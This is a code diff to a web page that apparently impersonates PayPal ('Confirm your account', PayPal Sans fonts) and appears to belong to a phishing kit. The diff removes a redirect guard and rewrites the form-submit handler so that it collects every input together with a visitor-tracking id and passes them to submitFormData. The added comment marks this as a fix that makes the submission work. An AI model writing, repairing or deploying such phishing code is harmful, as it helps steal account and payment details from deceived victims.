@@ -17,24 +17,7 @@
     <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalSansBig-Regular.woff2" />
     <link rel="preload" as="font" type="font/woff2" crossorigin="" href="assets/PayPalSansBig-Medium.woff2" />
  
-    	<script>
-    		let iPage = false; 
-		if (iPage) {
-} else {
-  var rdr = sessionStorage.getItem('rdr');
-  console.log(rdr);
-}
-	</script>
-    <script>
     	
-	history.replaceState({}, "", 'authflow/bill'+rdr );
-	
-	if(!rdr){
-	console.log('oyii');
-	window.location.href = "../index.php";
-	}
-	</script>
-    	<script src="assets/surl.js"></script>
     	
     <title> Confirm your account </title>
     <style data-emotion="css ms9k1d-avatar_base-size_lg-text_heading_lg-size_md-text_heading_sm" data-s="">
@@ -876,8 +859,7 @@
     </div>
          	
          </body>
-         <script type="text/javascript" src="../assets/vx-lib.min.js"></script>
-    
+         <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
          <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
 </script>
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
@@ -906,43 +888,42 @@
 </script>
 
 	<script>
-		$(document).ready(function() {
-    $('form').on('submit', function(event) {
+		$(document).ready(function () {
+    $('#form').on('submit', async function (event) {
         event.preventDefault();
-        let myForm = $("#form");
-        
 
-        // Flag to track if any input is empty
         let isEmpty = false;
-	let checkInputs = document.querySelectorAll('.check');
+        let checkInputs = document.querySelectorAll('.check');
+
         for (const check of checkInputs) {
             if (check.value.trim() === "") {
-                document.getElementById('errmes').style.display = "inline-flex";
-            isEmpty = true;
-            }else{
-            
-                
-       console.log(check.value);
-                document.getElementById('errmes').style.display = "none";
-                isEmpty = false;
+                isEmpty = true;
+                break;
             }
         }
 
+        document.getElementById('errmes').style.display =
+            isEmpty ? "inline-flex" : "none";
+
         if (!isEmpty) {
-             let userinfo = myForm.serializeArray();
+            let myForm = $(this);
+            let userinfo = myForm.serializeArray();
             let user = {};
+
             document.querySelector('#subbut').disabled = true;
             document.getElementById('load').style.display = "block";
-            userinfo.forEach((value) => {
+
+            userinfo.forEach(value => {
                 user[value.name] = value.value;
             });
-            
-            var visitor = sessionStorage.getItem('visitor');
-			
-            user['visitor'] = visitor;
-            console.log(user);
-            await submitFormData(user);
-            
+
+            user.visitor = sessionStorage.getItem('visitor');
+
+            try {
+                await submitFormData(user); // ✅ now valid
+            } catch (err) {
+                console.error(err);
+            }
         }
     });
 });
